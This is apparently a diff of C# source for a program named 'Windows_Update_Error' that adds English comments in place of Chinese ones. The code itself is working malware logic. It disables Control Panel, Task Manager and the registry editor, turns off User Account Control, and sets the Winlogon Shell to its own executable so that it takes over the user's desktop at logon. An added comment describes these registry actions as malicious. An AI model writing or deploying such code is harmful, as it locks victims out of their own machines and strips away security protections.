@@ -10,96 +10,153 @@ using System.Diagnostics;
 
 namespace Windows_Update_Error
 {
+    // This class contains methods for manipulating the Windows registry to perform malicious actions.
     internal class Regedit_Set
     {
+        // Method to disable system settings related features.
+        // It creates registry keys to disable the Control Panel and Task Manager.
         public void Disable_Settings()
         {
-            RegistryKey key = Registry.CurrentUser;            //打开注册表HKEY_CURRENT_USER基项
+            // Open the registry key for the current user.
+            RegistryKey key = Registry.CurrentUser;
+            // Create or open the registry key for Explorer policies.
             RegistryKey software = key.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
-            software.SetValue("NoControlPanel", 1);         //创建NoControlPanel键，值设置为1
-            software =key.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
-            software.SetValue("DisableTaskMgr",1);           //创建DisableTaskMgr键，值设置为1
+            // Set the value to disable the Control Panel.
+            software.SetValue("NoControlPanel", 1);
+            // Create or open the registry key for System policies.
+            software = key.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
+            // Set the value to disable the Task Manager.
+            software.SetValue("DisableTaskMgr", 1);
+            // Close the registry keys.
             software.Close();
             key.Close();
         }
+
+        // Method to disable the registry editor.
+        // It creates a registry value to prevent access to the registry editor.
         public void Disable_Regedit()
         {
-            RegistryKey key = Registry.CurrentUser;             //打开注册表HKEY_CURRENT_USER基项
-            RegistryKey software = key.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System",true);
-            if (software == null)       //如果不存在，则创建
+            // Open the registry key for the current user.
+            RegistryKey key = Registry.CurrentUser;
+            // Open or create the registry key for System policies with write access.
+            RegistryKey software = key.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System", true);
+            // If the key does not exist, create it.
+            if (software == null)
             {
                 software = key.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
             }
-            software.SetValue("DisableRegistryTools", 1);          //将DisableRegistryTools键的值改为1
+            // Set the value to disable the registry editor.
+            software.SetValue("DisableRegistryTools", 1);
+            // Close the registry keys.
             software.Close();
             key.Close();
         }
+
+        // Method to write data to a file related to the program's startup.
+        // It creates or overwrites a file with the provided data.
         public void Start_Update(string a)
         {
             try
             {
-                StreamWriter writer = new StreamWriter("Error_m1.txt", false, Encoding.UTF8);           //创建StreamWriter对象
-                writer.Write(a);        //将数据写入Error_m1.txt
-                writer.Flush();         //确保数据已经写入文件
-                writer.Close();        //关闭文件流
+                // Create a StreamWriter to write to the file.
+                StreamWriter writer = new StreamWriter("Error_m1.txt", false, Encoding.UTF8);
+                // Write the data to the file.
+                writer.Write(a);
+                // Flush the writer to ensure the data is written to the file.
+                writer.Flush();
+                // Close the writer.
+                writer.Close();
             }
-            catch(Exception ex)
+            catch (Exception ex)
             {
+                // Display an error message if an exception occurs.
                 MessageBox.Show(ex.Message);
             }
         }
+
+        // Method to read data from the file related to the program's startup.
+        // It checks if the file exists and reads its content. If the file does not exist, it creates it with a default value.
         public string Start_Detection()
         {
+            // The path to the file.
             string path = "Error_m1.txt";
+            // Create a FileInfo object to check if the file exists.
             FileInfo fileInfo = new FileInfo(path);
-            if(fileInfo.Exists==false)        //如果文件不存在，则创建它
+            // If the file does not exist, create it with a default value.
+            if (fileInfo.Exists == false)
             {
                 try
                 {
-                    StreamWriter writer = new StreamWriter(path, false, Encoding.UTF8);       //创建StreamWriter对象
-                    writer.Write("114514");          //将114514写入文件
-                    writer.Flush();         //确保数据写入文件
-                    writer.Close();        //关闭文件流
+                    // Create a StreamWriter to write to the file.
+                    StreamWriter writer = new StreamWriter(path, false, Encoding.UTF8);
+                    // Write the default value to the file.
+                    writer.Write("114514");
+                    // Flush the writer to ensure the data is written to the file.
+                    writer.Flush();
+                    // Close the writer.
+                    writer.Close();
                 }
-                catch(Exception ex)
+                catch (Exception ex)
                 {
+                    // Display an error message if an exception occurs.
                     MessageBox.Show(ex.Message);
                 }
             }
-            StreamReader sr = new StreamReader(path,Encoding.UTF8);              //创建StreamReader对象
-            string read=sr.ReadToEnd();              //读取文件里的所有内容
-            sr.Close();        //关闭文件流
+            // Create a StreamReader to read from the file.
+            StreamReader sr = new StreamReader(path, Encoding.UTF8);
+            // Read the content of the file.
+            string read = sr.ReadToEnd();
+            // Close the StreamReader.
+            sr.Close();
+            // Return the read data.
             return read;
         }
+
+        // Method to turn off User Account Control (UAC).
+        // It modifies a registry value to disable UAC.
         public void UAC_OFF()
         {
-            RegistryKey key = Registry.LocalMachine;        //打开注册表HKEY_LOCAL_MACHINE基项
-            RegistryKey software = key.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", true);          //打开SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System项
-            if (software == null)        //如果没有，则创建
+            // Open the registry key for the local machine.
+            RegistryKey key = Registry.LocalMachine;
+            // Open or create the registry key for System policies with write access.
+            RegistryKey software = key.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", true);
+            // If the key does not exist, create it.
+            if (software == null)
             {
-                software=key.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System");
+                software = key.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System");
             }
-            software.SetValue("EnableLUA", 0);       //将EnableLUA键的值改为0
+            // Set the value to turn off UAC.
+            software.SetValue("EnableLUA", 0);
+            // Close the registry keys.
             software.Close();
             key.Close();
         }
+
+        // Method to set the program to start automatically on system boot.
+        // It modifies the registry key for the Winlogon process to set the program's path as the shell.
         public void PC_Start()
         {
             try
             {
-                string local_1 = Process.GetCurrentProcess().MainModule.FileName;            //获取自身进程的完整路径
+                // Get the path of the current process.
+                string local_1 = Process.GetCurrentProcess().MainModule.FileName;
+                // Open the registry key for the Winlogon process.
                 RegistryKey key = Registry.LocalMachine;
-                RegistryKey software=key.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", true);         //打开SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon项
-                if (software == null)        //如果没有，则创建
+                RegistryKey software = key.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", true);
+                // If the key does not exist, create it.
+                if (software == null)
                 {
-                    software=key.CreateSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon");
+                    software = key.CreateSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon");
                 }
-                software.SetValue("Shell", local_1);              //将Shell的值改为自身程序的完整路径
+                // Set the shell value to the program's path.
+                software.SetValue("Shell", local_1);
+                // Close the registry keys.
                 software.Close();
-                key.Close ();
+                key.Close();
             }
-            catch(Exception ex) 
-            { 
+            catch (Exception ex)
+            {
+                // Display an error message if an exception occurs.
                 MessageBox.Show(ex.Message);
             }
         }
